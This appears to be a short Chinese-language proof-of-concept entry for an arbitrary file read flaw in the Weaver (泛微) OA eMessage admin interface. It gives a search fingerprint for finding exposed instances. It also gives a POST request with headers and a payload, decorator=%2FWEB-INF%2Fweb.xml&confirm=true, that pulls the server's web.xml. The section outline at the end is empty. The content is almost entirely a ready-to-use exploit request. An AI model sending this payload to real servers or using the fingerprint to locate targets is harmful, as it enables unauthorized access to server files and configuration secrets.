# 泛微emessage管理界面存在任意文件读取漏洞

- **系统**：泛微OA　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name=="emessage"`
- **请求**：`POST / HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: JSESSIONID=node03rmjswir0alnezvxvmi7jx8u1497.node0; csrf=P4jVgrrfqikGQQe`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 43`

**请求体 / payload**
```
decorator=%2FWEB-INF%2Fweb.xml&confirm=true
```

**其他**
- 泛微 emessage 管理界面存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微 emessage 管理界面